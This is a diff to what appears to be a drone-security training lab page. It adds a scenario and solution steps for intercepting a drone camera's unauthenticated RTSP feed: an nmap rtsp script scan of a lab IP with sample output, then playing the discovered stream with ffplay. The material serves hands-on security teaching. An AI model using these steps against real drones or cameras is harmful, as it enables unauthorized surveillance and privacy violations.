@@ -9,14 +9,45 @@ breadcrumb:
 sections:
   - title: Description
     content: |
-      Scenario Under development
+      In this scenario, an attacker intercepts the real-time video feed from a drone's camera. By leveraging insecure RTSP (Real-Time Streaming Protocol) streams, the attacker can gain unauthorized access to the video footage, which can then be used for surveillance or to gather sensitive information.
 
   - title: Resources
-    content: []
+    content:
+      - text: nmap
+        link: https://nmap.org/
+      - text: ffplay
+        link: https://www.ffmpeg.org/ffplay.html
 
-  - title: Solution Guide
+  - title: Solution
     collapsible: true
     steps:
-      - title: Reveal Solution (Spoiler Alert)
+      - title: Step 1
         description: |
-          <!-- TODO -->
+          We will be using ffplay to capture the real-time footage of the drone camera. If this is not installed in your Kali machine you can install it using the below command:
+          ```sudo apt install ffplay
+          ```
+      - title: Step 2
+        description: |
+          Conduct a recon RTSP scan for unauthenticated stream URLS via NMAP
+          ```nmap 10.13.0.3 --script rtsp*
+          ```
+          You should see the following response
+          ```Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 20:39 EDT
+          Nmap scan report for 10.13.0.3
+          Host is up (0.000092s latency).
+          Not shown: 998 closed tcp ports (conn-refused)
+          PORT     STATE SERVICE
+          554/tcp  open  rtsp
+          |_rtsp-methods: OPTIONS, DESCRIBE, ANNOUNCE, GET_PARAMETER, PAUSE, PLAY, RECORD, SETUP, SET_PARAMETER, TEARDOWN
+          | rtsp-url-brute: 
+          |   discovered: 
+          |_    rtsp://10.13.0.3/stream1
+          3000/tcp open  ppp
+
+          Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
+          ```
+      - title: Step 3
+        description: |
+          Run ffplay with drone rtsp stream
+          ```ffplay rtsp://10.13.0.3:554/stream1
+          ```
